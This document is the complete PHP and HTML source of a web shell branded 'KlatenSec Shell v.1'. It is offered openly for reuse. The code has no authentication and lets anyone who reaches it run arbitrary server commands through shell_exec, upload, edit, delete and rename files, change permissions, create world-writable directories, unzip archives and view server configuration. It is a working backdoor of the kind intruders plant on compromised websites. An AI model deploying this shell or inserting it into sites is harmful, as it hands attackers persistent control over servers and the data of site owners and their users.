<!-- (c) 2020 - pajaR_19 -->
<html>
<head>
<title>KlatenSec Shell</title>
<meta name="description" content="KlatenSec v.1">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap" rel="stylesheet">
<style>
body{
-webkit-tap-highlight-color: transparent;
font-family: 'Montserrat', sans-serif;
float: center;
background:#fff;
color: gray;
word-wrap: break-word;
font-size:17;
}

body.loading {
background: url('https://raw.githubusercontent.com/paja-R/KlatenSec-shell/master/logo.gif') no-repeat 50% 50%;
}
			
.head {
width :100%; 
background: #ebe9e6;
border-radius:15px; 
height:40px;
}
  
.judul {
color: gray; 
text-align: center;
padding : 12px;
}  

.pjrnot {
text-align: center;
width :100%; 
padding-top: 15px;
padding-bottom: 15px;
} 

button,input[type=submit] {
font-family: 'Montserrat', sans-serif;
outline: none;
background: #c7c5c1;
color:white;
height:25px;
width: 50px;
border-radius:40px;
border:none;
}		
 
button,input[type=submit]:hover {
font-family: 'Montserrat', sans-serif;
background: gray;
color:white;
border-radius:40px;
border:none;
}
  
input[type=text] { 
font-family: 'Montserrat', sans-serif;
outline: none;
height:25px;
padding-left:5px;
border:none;
border-radius:40px;
background: gray;
color:#FFFFFF;
}  

input[type=file] {
color:#FFFFFF;
background: gray;
border: none;
border-radius: 20px;
}

a {
color: #BB86FC;
text-decoration: none;
font-weight: bold ; 
} 

a:hover {
color: #aa68fc;
text-decoration: none;
font-weight: bold ; 
}

.sirkel {
outline: none;
background-color: gray;
width : 17px ;
height : 17px ;
border-radius : 50% ;
float : left; 
margin : 13px 5px;
border:none; 
}

.footer {
font-size: 15px;
text-align: center;
padding-top: 30px;
color: gray;
}

.pjrkont {
padding-top: 20px;
}

table { 
table-layout: fixed; 
width: 100%; 
border: 2px solid gray;
border-radius: 10px;
}

td { 
text-align: center;
border:none;
white-space:nowrap; 
overflow: hidden;  
}

tr:hover {
background-color: #f5f5f5;
}

textarea {
color: gray;
outline: none;
font-family: 'Montserrat', sans-serif;
resize: none;
width: 100%;
height: 40%;
border: 2px solid gray;
border-radius: 10px;
}

.scroll::-webkit-scrollbar {
display: none;
}
</style>
</head>
<body class="loading">
<div class="head">
<div class="sirkel" style="background: red"></div>
<div class="sirkel" style="background: yellow"></div>
<div class="sirkel" style="background: lime"></div>
<div class="judul">root<i class="fa fa-at"></i>KlatenSec</div>
</div>
<a name="up"></a>

<?php
// error handling
error_reporting(0);

// KlatenSec Shell v.1
// Coded by: pajaar :p
// Author URI: github.com/paja-R
// yeah this is open sOURce this code is ours
// free recode but don't delete author name :d
// contact me if u have question 
// pjr [at] hax [dot] or [dot] id


// lo gay
$pjry = "<div class='pjrnot' style='color: green'><i class='fa fa-check-circle'></i> berhasil</div>";
$pjrg = "<div class='pjrnot' style='color: darkred'><i class='fa fa-times-circle'></i> gagal</div>";
$pjra = "<font color=green><i class='fa fa-check-circle'></i> ON</font>";
$pjri = "<font color=darkred><i class='fa fa-times-circle'></i> OFF</font>";

echo "<center><h1>KlatenSec Shell v.1</h1></center>";

// get path
if(isset($_GET['dor'])){
$pjrdor = htmlspecialchars($_GET['dor']);
}else{
$pjrdor = htmlspecialchars(getcwd());
}

// replace \ (windows path) to /
$pjrdor = str_replace('\\','/',$pjrdor);

// cut /
$pjrdorz = explode('/',$pjrdor);

// menu
    echo "<div class='pjrnot'>";
	echo "<br><a href=?><i class='fa fa-home'></i></a> | ";
	echo "<a title='file' href=?manager><i class='fa fa-folder'></i></a> | ";
	echo "<a title='new dir' href='?newdir&dor=$pjrdor'><i class='fa fa-folder-plus'></i></a> | ";
	echo "<a title='new file' href='?newfile&dor=$pjrdor'><i class='fa fa-file-medical'></i></a> | ";
	echo "<a title='upload' href='?upload&dor=$pjrdor'><i class='fa fa-file-upload'></i></a> | ";
	echo "<a title='info' href='?winfo'><i class='fa fa-info-circle'></i></a> | ";
	echo "<a title='cmd' href='?cmd'><i class='fa fa-terminal'></i></a>";
	echo "</div>";

// path /
    echo "<i class='fa fa-folder-open' style='color: orange'></i>: /<a href=?manager&dor=/>r00t</a>/";	


// https://stackoverflow.com/questions/6290146/how-to-split-a-dor-properly-in-php
// cut url
$output = array();
foreach ($pjrdorz as $i => $chunk) {
$output[] = sprintf('<a href="?manager&dor=%s">%s</a>/',implode('/', array_slice($pjrdorz, 0, $i + 1)),$chunk);
}
echo implode($output);

// if writeable
echo is_writable($pjrdor) ? ' [Is writeable] ' : ' [Not Writeable] ';
echo '<div class="pjrkont">';

// convert size
// https://www.php.net/manual/en/function.filesize.php#120562 :p
function human_filesize($bytes, $decimals = 2) {
  $sz = 'BKMGTP';
  $factor = floor((strlen($bytes) - 1) / 3);
  return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sz[$factor];
}

// hapus folder sampai akar
// use rmdir if dir is empty
// https://www.php.net/manual/en/function.rmdir.php#110489
function hapusfol($dir) {
$files = array_diff(scandir($dir), array('.','..'));
foreach ($files as $file) {
(is_dir("$dir/$file")) ? hapusfol("$dir/$file") : unlink("$dir/$file"); }
return rmdir($dir);}
if (isset($_GET['ddel'])) {
echo hapusfol($_GET['dor']) ? $pjry : $pjrg;}

// delete file use unlink
elseif(isset($_GET['dfil'])){
echo unlink($_GET['file']) ? $pjry : $pjrg;}

// unzip
// https://stackoverflow.com/questions/8889025/unzip-a-file-with-php
elseif(isset($_GET['unzip'])){
if(isset($_POST['posisi'])){
$zip = new ZipArchive;
$res = $zip->open($_GET['file']);
if ($res === TRUE) {
  $zip->extractTo($_POST['posisi']);
  $zip->close();
  echo $pjry;
} else {
  echo $pjrg;}	
} echo '<form method="POST">
To : <input name="posisi" type="text" value="'.$_GET['dor'].'" />
<button type="submit"><i class="fa fa-paper-plane"></i></button>
</form>';}

// zip folder
// https://www.php.net/manual/en/ziparchive.addglob.php
elseif(isset($_GET['zip'])){
$klt = realdor($_GET['dor']);
$zip = new ZipArchive();
$zip->open(date("H-i-s").'-klatenxside.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);
$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($klt),RecursiveIteratorIterator::LEAVES_ONLY);
foreach ($files as $name => $file){
if (!$file->isDir()){
$filedor = $file->getRealdor();
$relativedor = substr($filedor, strlen($klt) + 1);
$zip->addFile($filedor, $relativedor);}}
$zip->close();
}

// upload file
elseif(isset($_GET['upload'])){
if(isset($_FILES['file'])){
echo copy($_FILES['file']['tmp_name'],$pjrdor.'/'.$_FILES['file']['name']) ? $pjry : $pjrg;}
echo '<form enctype="multipart/form-data" method="POST">
Upload: <input type="file" name="file" />
<button type="submit"><i class="fa fa-paper-plane"></i></button>
</form>';
}

// change permission 
elseif(isset($_GET['chmod'])){
if(isset($_POST['mod'])){
echo chmod($_GET['dor'],$_POST['mod']) ? $pjry : $pjrg;
$_GET['x'] = $_POST['mod'];}
echo '<form method="POST">
New Perm: <input name="mod" type="text" value="'.$_GET['x'].'" />
<button type="submit"><i class="fa fa-paper-plane"></i></button>
</form>';
}

// not work if shell_exec is of :p
elseif(isset($_GET['cmd'])){
if(isset($_POST['pjrcmdx'])){
print "<textarea style='color: green'>";
print shell_exec($_POST['pjrcmdx']);
print "</textarea>";
}
echo '<form method="POST">
command: <input name="pjrcmdx" type="text" value="dir" />
<button type="submit"><i class="fa fa-paper-plane"></i></button>
</form>';
}

// site info
elseif(isset($_GET['winfo'])){
echo "<br>Host: ".php_uname();
echo "<br>IP: ".gethostbyname($_SERVER['HTTP_HOST']);
echo "<br>Safe Mode: ";
echo ini_get(strtolower("safe_mode") == 'on') ? $pjra : $pjri;
echo "<br>MySQL: ";
echo function_exists('mysql_connect') ? $pjra : $pjri;
echo "<br>cURL: ";
echo function_exists('curl_version') ? $pjra : $pjri;
echo "<br>Disable Function: ";
$df = ini_get("disable_functions");
echo $df ? $df : $pjri;

}

// create file
elseif(isset($_GET['newfile'])){ 
if(isset($_POST['nwf'])) {
$newfile = htmlspecialchars($_GET['dor']."/".$_POST['yahaha']);
$kx = fopen($newfile, "a+"); 
echo ($kx) ? $pjry : $pjrg;
fwrite($kx, '//klatenxside');
fclose($kx);}
echo '<form method="POST">
New File: <input name="yahaha" type="text" value="KlatenSec.txt" />
<button type="submit" name="nwf"><i class="fa fa-paper-plane"></i></button>
</form>';
}

// make dir using mkdir
elseif(isset($_GET['newdir'])){ 
if(isset($_POST['nwd'])) {
echo mkdir($_GET['dor']."/".$_POST['yahaha'], 0777) ? $pjry : $pjrg;}
echo '<form method="POST">
New Dir: <input name="yahaha" type="text" value="KlatenSec" />
<button type="submit" name="nwd"><i class="fa fa-paper-plane"></i></button>
</form>';}

// rename file&fol
elseif(isset($_GET['rename'])){
if(isset($_POST['newname'])){
echo rename($_GET['dor']."/".$_GET['x'],$_GET['dor']."/".$_POST['newname']) ? $pjry : $pjrg;
$_GET['x'] = $_POST['newname'];}
echo '<form method="POST">
New Name: <input name="newname" type="text" value="'.$_GET['x'].'" />
<button type="submit"><i class="fa fa-paper-plane"></i></button>
</form>';}

// edit file
elseif(isset($_GET['edit'])){
if(isset($_POST['src'])){
$fp = fopen($_GET['dor'].$_GET['file'],'w');
echo fwrite($fp,$_POST['src']) ? $pjry : $pjrg;
fclose($fp);
} 
echo 'filename: '.$_GET['file'];
echo '<form method="POST">
<textarea name="src">'.htmlspecialchars(file_get_contents($_GET['dor'].$_GET['file'])).'</textarea>
<br /><br />
<input type="submit" value="save" />
</form>';}

// for ?manager
if(isset($_GET['manager'])){
	echo '</div><div class="pjrkont">';
	echo '<table>
  <tr>
   <td style="width:80px">Name</td>
   <td style="width:30px">type</td>
   <td style="width:50px">size</td>
   <td style="width:40px">Permission</td>
   <td style="width:80px">Last modified</td>
   <td style="width:100px">Action</td>
  </tr>';
  
        //pjrdor is dir value
      // pjrf is file value
	  
    // cut array
    $arr = array_slice(scandir($pjrdor), 2);

    //filltering folder first :p

    // looping folder
    foreach($arr as $pjrf){		
        if(is_dir("$pjrdor/$pjrf")){		
            $tot = $pjrdor."/";		
            echo "<tr><td style='text-align: left'><i class='fa fa-folder-open' style='color: orange'></i> <a href='?manager&dor=".$tot.$pjrf."'>" . $pjrf . "</a></td>";
			echo "<td>dir</td>";
			echo "<td>-</td>";
			
			// get permission
			$perm = substr(sprintf('%o', fileperms($tot.$pjrf)), -4);
			
			echo "<td><a title='chmod' href='?chmod&dor=$tot$pjrf&x=$perm'>".$perm."</a></td>";
			
			// get last mod w/ d-m-Y type date
			echo "<td>".date("d-m-Y", filemtime($tot.$pjrf))."</td>";
			echo "<td style='text-align: center'>
			<a title='rename' href='?rename&dor=$tot&x=$pjrf'><i class='fa fa-pencil-alt'></i></a> | 
			<a title='delete' onclick='return confirm(\"sure delete $pjrf?\")' href='?ddel&dor=$tot$pjrf'><i class='fa fa-trash-alt'></i></a> | 
            <a title='zip' href='?zip&dor=$tot$pjrf'><i class='fa fa-file-archive'></i></a>			
			</td></tr>";			
        }
    }
    // looping file
    foreach($arr as $pjrf){
        if( ! is_dir("$pjrdor/$pjrf")){
			$tot = $pjrdor."/";
			
			if (file_exists($tot.$pjrf)) {
            echo "<tr><td style='text-align: left'><i class='fa fa-file-alt'></i> <a href='?edit&dor=$pjrdor&file=/$pjrf'>" . $pjrf . "</a></td>";
			echo "<td>file</td>";
			
			// get converted filesize check human_filesize function
			echo "<td>".human_filesize(filesize($tot.$pjrf))."</td>";
			
			$perm = substr(sprintf('%o', fileperms($tot.$pjrf)), -4);
			echo "<td><a title='chmod' href='?chmod&dor=$tot$pjrf&x=$perm'>".$perm."</a></td>";
			echo "<td>".date("d-m-Y", filemtime($tot.$pjrf))."</td>";
			echo "<td style='text-align: center'>
			<a title='rename' href='?rename&dor=$pjrdor&x=$pjrf'><i class='fa fa-pencil-alt'></i></a> | 
			<a title='delete' onclick='return confirm(\"sure delete $pjrf?\")' href='?dfil&file=$tot$pjrf'><i class='fa fa-trash-alt'></i></a> | 
            <a title='edit' href='?edit&dor=$pjrdor&file=/$pjrf'><i class='fa fa-edit'></i></a>";
			
			// auto detect .zip file :b
			echo strpos($pjrf, '.zip') ? ' | <a title="unzip" href="?unzip&dor='.$pjrdor.'&file='.$pjrf.'"><i class="fa fa-file-archive"></i></a>' : '';
			echo "</td></tr>";		
				
        } 
    }
	} 
	echo "</table></div>";	
	
	// back to top button <a name=#up>
	echo '<a title="Back to top" href="#up" class="sirkel"><i class="fa fa-arrow-circle-up"></i></a>';
} 
	

// its me :d
echo "<div class=footer>&copy; ".date("Y")." - pajaar made with <i class='fa fa-mug-hot'></i></div>";

// preloader	
echo "<script type='text/javascript'>
			var body = document.getElementsByTagName('body')[0];
			var removeLoading = function() {
				setTimeout(function() {
					body.className = body.className.replace(/loading/, '');
				}, 1000);
			};
			removeLoading();
</script>
</body>
</html>";
?>
